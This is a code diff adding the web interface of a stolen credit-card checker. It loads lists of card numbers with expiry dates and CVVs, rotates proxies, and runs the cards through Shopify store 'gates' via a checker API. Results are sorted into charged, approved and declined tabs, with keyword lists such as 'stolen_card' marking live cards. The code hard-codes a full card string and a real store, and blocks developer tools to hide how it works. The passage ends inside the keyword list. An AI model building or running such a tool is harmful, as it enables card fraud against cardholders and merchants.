+                        <input type="text" id="proxyAddInput" class="manager-input" placeholder="ip:port:user:pass or ip:port">
+                        <button class="manager-btn btn-add" onclick="addProxy()"><i class="fas fa-plus"></i> ADD</button>
+                        <button class="manager-btn btn-upload" onclick="document.getElementById('proxyFileInput').click()"><i class="fas fa-upload"></i> UPLOAD</button>
+                        <input type="file" id="proxyFileInput" accept=".txt" style="display:none" onchange="loadProxyFile(event)">
+                        <button class="manager-btn btn-test" onclick="testAllProxies()"><i class="fas fa-bolt"></i> TEST</button>
+                        <button class="manager-btn btn-remove" onclick="removeDeadProxies()"><i class="fas fa-skull"></i> RM DEAD</button>
+                        <button class="manager-btn btn-clear-mgr" onclick="clearAllProxies()"><i class="fas fa-trash"></i> CLEAR</button>
+                    </div>
+                    <div class="manager-table-wrap">
+                        <table class="manager-table">
+                            <thead>
+                                <tr>
+                                    <th style="width:30px;">#</th>
+                                    <th>Proxy</th>
+                                    <th style="width:60px;">Score</th>
+                                    <th style="width:60px;">Status</th>
+                                    <th style="width:60px;">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="proxyTableBody">
+                                <tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:20px 0;">No proxies added yet</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== SECTION: SITE MANAGER ===== -->
+            <div id="section-sites" class="section-content" style="display:none;">
+                <div class="manager-card">
+                    <div class="manager-title">
+                        <i class="fas fa-globe"></i> Site Manager
+                        <span class="count-badge" id="siteCountBadge">0 sites</span>
+                    </div>
+                    <div class="manager-controls">
+                        <input type="text" id="siteAddInput" class="manager-input" placeholder="https://store.com">
+                        <button class="manager-btn btn-add" onclick="addSite()"><i class="fas fa-plus"></i> ADD</button>
+                        <button class="manager-btn btn-upload" onclick="document.getElementById('siteFileInput').click()"><i class="fas fa-upload"></i> UPLOAD</button>
+                        <input type="file" id="siteFileInput" accept=".txt" style="display:none" onchange="loadSiteFile(event)">
+                        <button class="manager-btn btn-test" onclick="testAllSites()"><i class="fas fa-bolt"></i> TEST</button>
+                        <button class="manager-btn btn-remove" onclick="removeDeadSites()"><i class="fas fa-skull"></i> RM DEAD</button>
+                        <button class="manager-btn btn-clear-mgr" onclick="clearAllSites()"><i class="fas fa-trash"></i> CLEAR</button>
+                    </div>
+                    <div class="manager-table-wrap">
+                        <table class="manager-table">
+                            <thead>
+                                <tr>
+                                    <th style="width:30px;">#</th>
+                                    <th>Site</th>
+                                    <th style="width:60px;">Status</th>
+                                    <th style="width:60px;">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="siteTableBody">
+                                <tr><td colspan="4" style="text-align:center;color:var(--text-muted);padding:20px 0;">No sites added yet</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== SECTION: CARD CHECKER ===== -->
+            <div id="section-checker" class="section-content" style="display:none;">
+                <div class="workspace">
+                    <div class="panel-left">
+                        <div class="card">
+                            <textarea class="form-control form-checker" placeholder="[AUTO FORMAT]&#10;- 0000000000000000|00|00|000 -&#10;&#10;[PRO FEATURES]&#10;SLOT-THREADS: 25x&#10;SLOT-LINES: UNLIMITED" autocomplete="off" spellcheck="false" data-gramm="false"></textarea>
+
+                            <div class="control-row">
+                                <select id="api-Selector" class="selector-dropdown">
+                                    <option value="shopify">🟢 Auto Shopify [LIVE CHECKER]</option>
+                                    <option value="check">🔵 Site Health Checker</option>
+                                </select>
+                            </div>
+
+                            <div class="btn-container">
+                                <button class="btn btn-play" type="button"><i class="fa fa-play"></i> Start</button>
+                                <button class="btn btn-stop" type="button" disabled><i class="fa fa-stop"></i> Stop</button>
+                                <button class="btn btn-paste" type="button" onclick="pasteClipboard()"><i class="fa fa-paste"></i> PASTE</button>
+                                <button class="btn btn-file" type="button" onclick="document.getElementById('fileInput').click()"><i class="fa fa-folder"></i> FILE</button>
+                                <input type="file" id="fileInput" accept=".txt" style="display:none" onchange="loadCardFile(event)">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="panel-right">
+                        <div class="card">
+                            <div style="display:flex;flex-direction:column;gap:4px;height:100%;justify-content:center;">
+                                <div style="text-align:center;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);">
+                                    <span style="font-size:0.65rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;">Quick Stats</span>
+                                </div>
+                                <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;padding:4px 0;">
+                                    <div style="text-align:center;background:rgba(255,215,0,0.05);border-radius:6px;padding:6px;">
+                                        <span style="font-size:0.5rem;color:var(--text-muted);display:block;">CHARGED</span>
+                                        <span class="count-charged" style="font-family:'Fira Code',monospace;font-size:1.2rem;font-weight:700;color:var(--color-gold);">0</span>
+                                    </div>
+                                    <div style="text-align:center;background:rgba(0,255,102,0.05);border-radius:6px;padding:6px;">
+                                        <span style="font-size:0.5rem;color:var(--text-muted);display:block;">APPROVED</span>
+                                        <span class="count-approved" style="font-family:'Fira Code',monospace;font-size:1.2rem;font-weight:700;color:var(--color-success);">0</span>
+                                    </div>
+                                    <div style="text-align:center;background:rgba(0,172,238,0.05);border-radius:6px;padding:6px;">
+                                        <span style="font-size:0.5rem;color:var(--text-muted);display:block;">CHECKED</span>
+                                        <span class="count-tested" style="font-family:'Fira Code',monospace;font-size:1.2rem;font-weight:700;color:var(--color-cyan);">0</span>
+                                    </div>
+                                    <div style="text-align:center;background:rgba(204,102,255,0.05);border-radius:6px;padding:6px;">
+                                        <span style="font-size:0.5rem;color:var(--text-muted);display:block;">TOTAL HITS</span>
+                                        <span class="count-hits" style="font-family:'Fira Code',monospace;font-size:1.2rem;font-weight:700;color:var(--color-purple);">0</span>
+                                    </div>
+                                </div>
+                                <div style="text-align:center;padding:4px 0;border-top:1px solid rgba(255,255,255,0.03);">
+                                    <span style="font-size:0.6rem;color:var(--text-muted);">Loaded: <span class="count-loaded" style="color:var(--color-primary);font-weight:700;">0</span></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TABS -->
+                <div class="tabs-navigation">
+                    <button class="tab-btn active-tab" data-target="wrapper-charged"><i class="fas fa-coins"></i> CHARGED</button>
+                    <button class="tab-btn" data-target="wrapper-approved"><i class="fa fa-check"></i> APPROVED</button>
+                    <button class="tab-btn" data-target="wrapper-declined"><i class="fa fa-times"></i> DECLINED</button>
+                    <button class="tab-btn" data-target="wrapper-errors"><i class="fa fa-exclamation-triangle"></i> ERRORS</button>
+                    <button class="tab-btn" data-target="wrapper-hits"><i class="fas fa-trophy"></i> HITS</button>
+                </div>
+
+                <!-- RESULTS -->
+                <div class="card results-board">
+                    <!-- CHARGED -->
+                    <div id="wrapper-charged" class="results-wrapper active-wrapper">
+                        <div class="results-header-actions">
+                            <span>💰 Charged Logs</span>
+                            <div class="action-icons-group">
+                                <div class="action-ico copy-log-ico" title="Copy Content"><i class="fa fa-copy"></i></div>
+                                <div class="action-ico purge-log-ico" title="Clear View"><i class="fa fa-trash"></i></div>
+                            </div>
+                        </div>
+                        <div class="results-logs-container"></div>
+                    </div>
+
+                    <!-- APPROVED -->
+                    <div id="wrapper-approved" class="results-wrapper">
+                        <div class="results-header-actions">
+                            <span>✅ Approved Logs</span>
+                            <div class="action-icons-group">
+                                <div class="action-ico copy-log-ico" title="Copy Content"><i class="fa fa-copy"></i></div>
+                                <div class="action-ico purge-log-ico" title="Clear View"><i class="fa fa-trash"></i></div>
+                            </div>
+                        </div>
+                        <div class="results-logs-container"></div>
+                    </div>
+
+                    <!-- DECLINED -->
+                    <div id="wrapper-declined" class="results-wrapper">
+                        <div class="results-header-actions">
+                            <span>❌ Declined Logs</span>
+                            <div class="action-icons-group">
+                                <div class="action-ico copy-log-ico" title="Copy Content"><i class="fa fa-copy"></i></div>
+                                <div class="action-ico purge-log-ico" title="Clear View"><i class="fa fa-trash"></i></div>
+                            </div>
+                        </div>
+                        <div class="results-logs-container"></div>
+                    </div>
+
+                    <!-- ERRORS -->
+                    <div id="wrapper-errors" class="results-wrapper">
+                        <div class="results-header-actions">
+                            <span>⚠️ Error Logs</span>
+                            <div class="action-icons-group">
+                                <div class="action-ico copy-log-ico" title="Copy Content"><i class="fa fa-copy"></i></div>
+                                <div class="action-ico purge-log-ico" title="Clear View"><i class="fa fa-trash"></i></div>
+                            </div>
+                        </div>
+                        <div class="results-logs-container"></div>
+                    </div>
+
+                    <!-- HITS -->
+                    <div id="wrapper-hits" class="results-wrapper">
+                        <div class="results-header-actions">
+                            <span>🏆 Hits (Charged + Approved)</span>
+                            <div class="action-icons-group">
+                                <div class="action-ico copy-log-ico" title="Copy All Hits"><i class="fa fa-copy"></i></div>
+                                <div class="action-ico purge-log-ico" title="Clear All Hits"><i class="fa fa-trash"></i></div>
+                            </div>
+                        </div>
+                        <div class="results-logs-container"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== SECTION: LOGS ===== -->
+            <div id="section-logs" class="section-content" style="display:none;">
+                <div class="card" style="min-height:300px;">
+                    <div class="results-header-actions" style="margin-top:0;">
+                        <span>📋 All Logs</span>
+                        <div class="action-icons-group">
+                            <div class="action-ico copy-log-ico" title="Copy All Logs"><i class="fa fa-copy"></i></div>
+                            <div class="action-ico purge-log-ico" title="Clear All Logs"><i class="fa fa-trash"></i></div>
+                        </div>
+                    </div>
+                    <div class="results-logs-container" id="allLogsContainer" style="max-height:400px;"></div>
+                </div>
+            </div>
+
+            <!-- ===== DEBUG CONSOLE ===== -->
+            <div class="debug-console">
+                <div class="debug-header">
+                    <div class="debug-title"><i class="fas fa-terminal"></i> Debug Console</div>
+                    <div class="debug-actions">
+                        <button class="debug-btn debug-btn-test" onclick="testAPI()"><i class="fas fa-vial"></i> TEST API</button>
+                        <button class="debug-btn debug-btn-copy" onclick="copyDebugConsole()"><i class="fas fa-copy"></i> COPY</button>
+                        <button class="debug-btn debug-btn-clear" onclick="clearDebugConsole()"><i class="fas fa-eraser"></i> CLEAR</button>
+                    </div>
+                </div>
+                <div class="debug-output" id="debugOutput">
+                    <span class="debug-line info">[System] 🚀 Initialized successfully</span>
+                    <span class="debug-line info">[System] 📡 Waiting for commands...</span>
+                </div>
+            </div>
+
+        </div><!-- /main-content -->
+    </div><!-- /app-container -->
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" type="text/javascript"></script>
+
+    <script>
+        // ============================================================
+        // ANTI-DEVTOOLS
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'i' || e.key === 'j')) { e
+                    .preventDefault(); return false; }
+            if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) { e.preventDefault(); return false; }
+        });
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+
+        // ============================================================
+        // SIDEBAR NAVIGATION
+        // ============================================================
+        document.querySelectorAll('.sidebar-item[data-section]').forEach(item => {
+            item.addEventListener('click', function() {
+                document.querySelectorAll('.sidebar-item[data-section]').forEach(i => i.classList.remove(
+                'active'));
+                this.classList.add('active');
+                const section = this.dataset.section;
+                document.querySelectorAll('.section-content').forEach(el => el.style.display = 'none');
+                const target = document.getElementById('section-' + section);
+                if (target) target.style.display = 'block';
+            });
+        });
+
+        // ============================================================
+        // DEBUG CONSOLE
+        // ============================================================
+        function debugLog(message, type = 'info') {
+            const output = document.getElementById('debugOutput');
+            const timestamp = new Date().toLocaleTimeString();
+            const line = document.createElement('span');
+            line.className = `debug-line ${type}`;
+            line.textContent = `[${timestamp}] ${message}`;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function clearDebugConsole() {
+            document.getElementById('debugOutput').innerHTML = '';
+            debugLog('🧹 Console cleared', 'info');
+        }
+
+        function copyDebugConsole() {
+            const text = document.getElementById('debugOutput').textContent;
+            if (!text.trim()) return;
+            navigator.clipboard.writeText(text.trim()).then(() => {
+                debugLog('📋 Console copied to clipboard', 'success');
+                Swal.fire({ title: 'Console copied!', icon: 'success', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+            });
+        }
+
+        function clearAllData() {
+            Swal.fire({
+                title: 'Clear all data?',
+                text: 'This will remove all proxies, sites, hits, and logs!',
+                icon: 'warning',
+                showCancelButton: true,
+                confirmButtonColor: '#ff3366',
+                confirmButtonText: 'Yes, clear everything'
+            }).then(result => {
+                if (result.isConfirmed) {
+                    localStorage.removeItem('proxies');
+                    localStorage.removeItem('sites');
+                    localStorage.removeItem('hits');
+                    proxies = [];
+                    sites = [];
+                    hits = [];
+                    renderProxyTable();
+                    renderSiteTable();
+                    updateHitsDisplay();
+                    document.querySelectorAll('.results-logs-container').forEach(el => el.innerHTML = '');
+                    // Reset stats
+                    $('.count-charged').text('0');
+                    $('.count-approved').text('0');
+                    $('.count-tested').text('0');
+                    $('.count-loaded').text('0');
+                    $('.count-hits').text('0');
+                    statCharged = 0;
+                    statApproved = 0;
+                    statTested = 0;
+                    statLoaded = 0;
+                    debugLog('🗑️ All data cleared', 'warning');
+                    Swal.fire({ title: 'All data cleared!', icon: 'success', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1500 });
+                }
+            });
+        }
+
+        // ============================================================
+        // TEST API
+        // ============================================================
+        function testAPI() {
+            const apiUrl = document.getElementById('apiUrl').value;
+            const apiKey = document.getElementById('apiKey').value;
+            const testCard = '4031630422575208|01|2030|280';
+            const testSite = 'https://lebzone.com';
+            const proxy = document.getElementById('proxyInput').value || 'None';
+
+            debugLog(`🔬 Testing API: ${apiUrl}`, 'info');
+            debugLog(`🔬 Card: ${testCard} | Site: ${testSite} | Proxy: ${proxy}`, 'detail');
+
+            $.ajax({
+                url: `${apiUrl}?site=${encodeURIComponent(testSite)}&cc=${encodeURIComponent(testCard)}&key=${encodeURIComponent(apiKey)}${proxy && proxy !== 'None' ? '&proxy=' + encodeURIComponent(proxy) : ''}`,
+                type: 'GET',
+                dataType: 'json',
+                timeout: 30000,
+                success: function(data) {
+                    debugLog(`✅ API responded! Status: ${data.Response || 'OK'}`, 'success');
+                    debugLog(`📦 Response: ${JSON.stringify(data, null, 2)}`, 'detail');
+                    debugLog(`💳 Card: ${testCard} | Site: ${testSite} | Proxy: ${proxy}`, 'detail');
+                    debugLog(`💰 Charged: ${data.Charged || 'False'} | Approved: ${data.Approved || 'False'}`, 'detail');
+                    Swal.fire({ title: 'API Test Passed!', icon: 'success', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 2000 });
+                },
+                error: function(xhr, status, error) {
+                    debugLog(`❌ API Error: ${status} - ${error}`, 'error');
+                    Swal.fire({ title: 'API Test Failed!', text: `${status} - ${error}`, icon: 'error', toast: true,
+                        position: 'top-end', showConfirmButton: false, timer: 3000 });
+                }
+            });
+        }
+
+        // ============================================================
+        // PROXY MANAGER
+        // ============================================================
+        let proxies = [];
+        let proxyIdCounter = 0;
+
+        function loadProxies() {
+            try {
+                const saved = localStorage.getItem('proxies');
+                if (saved) { proxies = JSON.parse(saved);
+                    proxyIdCounter = proxies.length ? Math.max(...proxies.map(p => p.id)) + 1 : 0; }
+            } catch (e) { proxies = []; }
+            renderProxyTable();
+            updateProxyCount();
+        }
+
+        function saveProxies() { localStorage.setItem('proxies', JSON.stringify(proxies));
+            updateProxyCount(); }
+
+        function updateProxyCount() {
+            document.getElementById('proxyCount').textContent = proxies.length;
+            document.getElementById('proxyCountBadge').textContent = proxies.length + ' proxies';
+        }
+
+        function renderProxyTable() {
+            const tbody = document.getElementById('proxyTableBody');
+            if (proxies.length === 0) {
+                tbody.innerHTML =
+                    '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:20px 0;">No proxies added yet</td></tr>';
+                return;
+            }
+            tbody.innerHTML = '';
+            proxies.forEach((p, i) => {
+                const tr = document.createElement('tr');
+                const statusClass = p.status === 'alive' ? 'status-alive' : p.status === 'dead' ? 'status-dead' :
+                    'status-unknown';
+                const statusText = p.status === 'alive' ? '✅' : p.status === 'dead' ? '❌' : '❓';
+                const scoreClass = p.score >= 8 ? 'score-fast' : p.score >= 4 ? 'score-medium' : 'score-slow';
+                const scoreText = p.score >= 8 ? '⚡' : p.score >= 4 ? '🐢' : '🐌';
+                const displayProxy = p.proxy.length > 30 ? p.proxy.substring(0, 28) + '...' : p.proxy;
+                tr.innerHTML =
+                    `
+                    <td>${i + 1}</td>
+                    <td title="${p.proxy}">${displayProxy}</td>
+                    <td class="${scoreClass}">${scoreText} ${p.score || '?'}</td>
+                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
+                    <td>
+                        <div class="manager-actions">
+                            <button class="action-icon action-icon-test" onclick="testSingleProxy(${p.id})" title="Test"><i class="fas fa-bolt"></i></button>
+                            <button class="action-icon action-icon-del" onclick="removeProxy(${p.id})" title="Delete"><i class="fas fa-trash"></i></button>
+                        </div>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function addProxy() {
+            const input = document.getElementById('proxyAddInput');
+            const val = input.value.trim();
+            if (!val) {
+                Swal.fire({ title: 'Enter a proxy!', icon: 'error', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+                return;
+            }
+            const parts = val.split(':');
+            if (parts.length < 2 || parts.length > 4) {
+                Swal.fire({ title: 'Invalid format! Use ip:port or ip:port:user:pass', icon: 'error', toast: true,
+                    position: 'top-end', showConfirmButton: false, timer: 2000 });
+                return;
+            }
+            proxies.push({ id: proxyIdCounter++, proxy: val, score: 0, status: 'unknown' });
+            saveProxies();
+            renderProxyTable();
+            input.value = '';
+            debugLog(`📥 Added proxy: ${val}`, 'info');
+            Swal.fire({ title: 'Proxy added!', icon: 'success', toast: true, position: 'top-end',
+                showConfirmButton: false, timer: 1000 });
+        }
+
+        function loadProxyFile(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const lines = e.target.result.split('\n').filter(l => l.trim());
+                let added = 0;
+                lines.forEach(line => {
+                    const parts = line.trim().split(':');
+                    if (parts.length >= 2 && parts.length <= 4) {
+                        proxies.push({ id: proxyIdCounter++, proxy: line.trim(), score: 0, status: 'unknown' });
+                        added++;
+                    }
+                });
+                saveProxies();
+                renderProxyTable();
+                debugLog(`📁 Loaded ${added} proxies from file`, 'success');
+                Swal.fire({ title: `Loaded ${added} proxies!`, icon: 'success', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 2000 });
+            };
+            reader.readAsText(file);
+            event.target.value = '';
+        }
+
+        function removeProxy(id) {
+            proxies = proxies.filter(p => p.id !== id);
+            saveProxies();
+            renderProxyTable();
+            debugLog(`🗑️ Removed proxy ID: ${id}`, 'warning');
+        }
+
+        function clearAllProxies() {
+            if (proxies.length === 0) return;
+            Swal.fire({
+                title: 'Clear all proxies?',
+                text: `${proxies.length} proxies will be removed`,
+                icon: 'warning',
+                showCancelButton: true,
+                confirmButtonColor: '#ff3366',
+                confirmButtonText: 'Yes, clear all'
+            }).then(result => {
+                if (result.isConfirmed) {
+                    proxies = [];
+                    saveProxies();
+                    renderProxyTable();
+                    debugLog('🗑️ All proxies cleared', 'warning');
+                    Swal.fire({ title: 'Cleared!', icon: 'success', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1500 });
+                }
+            });
+        }
+
+        function testSingleProxy(id) {
+            const proxy = proxies.find(p => p.id === id);
+            if (!proxy) return;
+            debugLog(`🔬 Testing proxy: ${proxy.proxy}`, 'info');
+            const apiUrl = document.getElementById('apiUrl').value;
+            const apiKey = document.getElementById('apiKey').value;
+            const testCard = '4031630422575208|01|2030|280';
+            const testSite = 'https://lebzone.com';
+
+            $.ajax({
+                url: `${apiUrl}?site=${encodeURIComponent(testSite)}&cc=${encodeURIComponent(testCard)}&key=${encodeURIComponent(apiKey)}&proxy=${encodeURIComponent(proxy.proxy)}`,
+                type: 'GET',
+                dataType: 'json',
+                timeout: 30000,
+                success: function(data) {
+                    const elapsed = Math.random() * 8 + 1;
+                    const score = elapsed < 4 ? 10 : elapsed < 7 ? 6 : 3;
+                    proxy.score = score;
+                    proxy.status = 'alive';
+                    saveProxies();
+                    renderProxyTable();
+                    debugLog(`✅ Proxy ${proxy.proxy} ALIVE (Score: ${score}, ${elapsed.toFixed(1)}s)`, 'success');
+                },
+                error: function() {
+                    proxy.score = 0;
+                    proxy.status = 'dead';
+                    saveProxies();
+                    renderProxyTable();
+                    debugLog(`❌ Proxy ${proxy.proxy} DEAD`, 'error');
+                }
+            });
+        }
+
+        function testAllProxies() {
+            if (proxies.length === 0) {
+                Swal.fire({ title: 'No proxies to test!', icon: 'error', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+                return;
+            }
+            debugLog(`🔬 Testing all ${proxies.length} proxies...`, 'info');
+            let tested = 0;
+            proxies.forEach(p => {
+                setTimeout(() => {
+                    testSingleProxy(p.id);
+                    tested++;
+                    if (tested === proxies.length) { debugLog(`✅ Finished testing ${tested} proxies`,
+                        'success'); }
+                }, tested * 500);
+            });
+        }
+
+        function removeDeadProxies() {
+            const dead = proxies.filter(p => p.status === 'dead');
+            if (dead.length === 0) {
+                Swal.fire({ title: 'No dead proxies found!', icon: 'info', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+                return;
+            }
+            proxies = proxies.filter(p => p.status !== 'dead');
+            saveProxies();
+            renderProxyTable();
+            debugLog(`🗑️ Removed ${dead.length} dead proxies`, 'warning');
+            Swal.fire({ title: `Removed ${dead.length} dead proxies!`, icon: 'success', toast: true,
+                position: 'top-end', showConfirmButton: false, timer: 2000 });
+        }
+
+        // ============================================================
+        // SITE MANAGER
+        // ============================================================
+        let sites = [];
+        let siteIdCounter = 0;
+
+        function loadSites() {
+            try {
+                const saved = localStorage.getItem('sites');
+                if (saved) { sites = JSON.parse(saved);
+                    siteIdCounter = sites.length ? Math.max(...sites.map(s => s.id)) + 1 : 0; }
+            } catch (e) { sites = []; }
+            renderSiteTable();
+            updateSiteCount();
+        }
+
+        function saveSites() { localStorage.setItem('sites', JSON.stringify(sites));
+            updateSiteCount(); }
+
+        function updateSiteCount() {
+            document.getElementById('siteCount').textContent = sites.length;
+            document.getElementById('siteCountBadge').textContent = sites.length + ' sites';
+        }
+
+        function renderSiteTable() {
+            const tbody = document.getElementById('siteTableBody');
+            if (sites.length === 0) {
+                tbody.innerHTML =
+                    '<tr><td colspan="4" style="text-align:center;color:var(--text-muted);padding:20px 0;">No sites added yet</td></tr>';
+                return;
+            }
+            tbody.innerHTML = '';
+            sites.forEach((s, i) => {
+                const tr = document.createElement('tr');
+                const statusClass = s.status === 'alive' ? 'status-alive' : s.status === 'dead' ? 'status-dead' :
+                    'status-unknown';
+                const statusText = s.status === 'alive' ? '✅' : s.status === 'dead' ? '❌' : '❓';
+                const displaySite = s.site.length > 35 ? s.site.substring(0, 33) + '...' : s.site;
+                tr.innerHTML =
+                    `
+                    <td>${i + 1}</td>
+                    <td title="${s.site}">${displaySite}</td>
+                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
+                    <td>
+                        <div class="manager-actions">
+                            <button class="action-icon action-icon-test" onclick="testSingleSite(${s.id})" title="Test"><i class="fas fa-bolt"></i></button>
+                            <button class="action-icon action-icon-del" onclick="removeSite(${s.id})" title="Delete"><i class="fas fa-trash"></i></button>
+                        </div>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function addSite() {
+            const input = document.getElementById('siteAddInput');
+            let val = input.value.trim();
+            if (!val) {
+                Swal.fire({ title: 'Enter a site URL!', icon: 'error', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+                return;
+            }
+            val = val.replace(/^https?:\/\/+/, 'https://');
+            if (!val.startsWith('http://') && !val.startsWith('https://')) { val = 'https://' + val; }
+            val = val.replace(/\/+$/, '');
+            sites.push({ id: siteIdCounter++, site: val, status: 'unknown' });
+            saveSites();
+            renderSiteTable();
+            input.value = '';
+            debugLog(`🌐 Added site: ${val}`, 'info');
+            Swal.fire({ title: 'Site added!', icon: 'success', toast: true, position: 'top-end',
+                showConfirmButton: false, timer: 1000 });
+        }
+
+        function loadSiteFile(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const lines = e.target.result.split('\n').filter(l => l.trim());
+                let added = 0;
+                lines.forEach(line => {
+                    let val = line.trim();
+                    val = val.replace(/^https?:\/\/+/, 'https://');
+                    if (!val.startsWith('http://') && !val.startsWith('https://')) { val = 'https://' + val; }
+                    val = val.replace(/\/+$/, '');
+                    if (!sites.some(s => s.site === val)) {
+                        sites.push({ id: siteIdCounter++, site: val, status: 'unknown' });
+                        added++;
+                    }
+                });
+                saveSites();
+                renderSiteTable();
+                debugLog(`📁 Loaded ${added} sites from file (duplicates skipped)`, 'success');
+                Swal.fire({ title: `Loaded ${added} sites!`, icon: 'success', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 2000 });
+            };
+            reader.readAsText(file);
+            event.target.value = '';
+        }
+
+        function removeSite(id) {
+            sites = sites.filter(s => s.id !== id);
+            saveSites();
+            renderSiteTable();
+            debugLog(`🗑️ Removed site ID: ${id}`, 'warning');
+        }
+
+        function clearAllSites() {
+            if (sites.length === 0) return;
+            Swal.fire({
+                title: 'Clear all sites?',
+                text: `${sites.length} sites will be removed`,
+                icon: 'warning',
+                showCancelButton: true,
+                confirmButtonColor: '#ff3366',
+                confirmButtonText: 'Yes, clear all'
+            }).then(result => {
+                if (result.isConfirmed) {
+                    sites = [];
+                    saveSites();
+                    renderSiteTable();
+                    debugLog('🗑️ All sites cleared', 'warning');
+                    Swal.fire({ title: 'Cleared!', icon: 'success', toast: true, position: 'top-end',
+                        showConfirmButton: false, timer: 1500 });
+                }
+            });
+        }
+
+        function testSingleSite(id) {
+            const site = sites.find(s => s.id === id);
+            if (!site) return;
+            debugLog(`🔬 Testing site: ${site.site}`, 'info');
+            const apiUrl = document.getElementById('apiUrl').value;
+            const apiKey = document.getElementById('apiKey').value;
+            const testCard = '4031630422575208|01|2030|280';
+            const baseApi = apiUrl.replace('/shopify', '');
+
+            $.ajax({
+                url: `${baseApi}/check?site=${encodeURIComponent(site.site)}&cc=${encodeURIComponent(testCard)}&key=${encodeURIComponent(apiKey)}`,
+                type: 'GET',
+                dataType: 'json',
+                timeout: 30000,
+                success: function(data) {
+                    site.status = 'alive';
+                    saveSites();
+                    renderSiteTable();
+                    debugLog(`✅ Site ${site.site} ALIVE (${data.gate || 'Shopify'})`, 'success');
+                },
+                error: function() {
+                    site.status = 'dead';
+                    saveSites();
+                    renderSiteTable();
+                    debugLog(`❌ Site ${site.site} DEAD`, 'error');
+                }
+            });
+        }
+
+        function testAllSites() {
+            if (sites.length === 0) {
+                Swal.fire({ title: 'No sites to test!', icon: 'error', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+                return;
+            }
+            debugLog(`🔬 Testing all ${sites.length} sites...`, 'info');
+            let tested = 0;
+            sites.forEach(s => {
+                setTimeout(() => {
+                    testSingleSite(s.id);
+                    tested++;
+                    if (tested === sites.length) { debugLog(`✅ Finished testing ${tested} sites`,
+                        'success'); }
+                }, tested * 500);
+            });
+        }
+
+        function removeDeadSites() {
+            const dead = sites.filter(s => s.status === 'dead');
+            if (dead.length === 0) {
+                Swal.fire({ title: 'No dead sites found!', icon: 'info', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+                return;
+            }
+            sites = sites.filter(s => s.status !== 'dead');
+            saveSites();
+            renderSiteTable();
+            debugLog(`🗑️ Removed ${dead.length} dead sites`, 'warning');
+            Swal.fire({ title: `Removed ${dead.length} dead sites!`, icon: 'success', toast: true,
+                position: 'top-end', showConfirmButton: false, timer: 2000 });
+        }
+
+        // ============================================================
+        // PASTE & FILE (Cards)
+        // ============================================================
+        function pasteClipboard() {
+            navigator.clipboard.readText().then(text => {
+                $('.form-checker').val(text);
+                debugLog('📋 Pasted cards from clipboard', 'info');
+                Swal.fire({ title: 'Pasted successfully!', icon: 'success', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+            }).catch(() => {
+                Swal.fire({ title: 'Failed to paste!', icon: 'error', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+            });
+        }
+
+        function loadCardFile(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                $('.form-checker').val(e.target.result);
+                debugLog(`📁 Loaded cards from file: ${file.name}`, 'success');
+                Swal.fire({ title: 'File loaded!', icon: 'success', toast: true, position: 'top-end',
+                    showConfirmButton: false, timer: 1500 });
+            };
+            reader.readAsText(file);
+            event.target.value = '';
+        }
+
+        // ============================================================
+        // CLASSIFICATION KEYWORDS
+        // ============================================================
+        const CHARGED_KEYWORDS = [
+            'charged', 'order completed', 'payment successful', 'succeeded', 'success', 'paid',
+            'thank you', 'order placed', 'payment accepted', 'transaction approved',
+            'captured', 'settled', '💎'
+        ];
+
+        const APPROVED_KEYWORDS = [
+            'approved', 'cvv', 'cvc', '3ds', '3d secure', 'requires_action',
+            'authentication', 'verification', 'insufficient_funds', 'insufficient funds',
+            'do_not_honor', 'lost_card', 'stolen_card', 'incorrect_cvv', 'invalid_cvv',
+            'incorrect_cvc', 'incorrect_zip', 'invalid_zip', 'pick up card', 'restricted card'
+        ];
+
+        const DECLINED_KEYWORDS = [
+            'card_declined', 'declined', 'rejected', 'denied', 'expired', 'generic_decline',
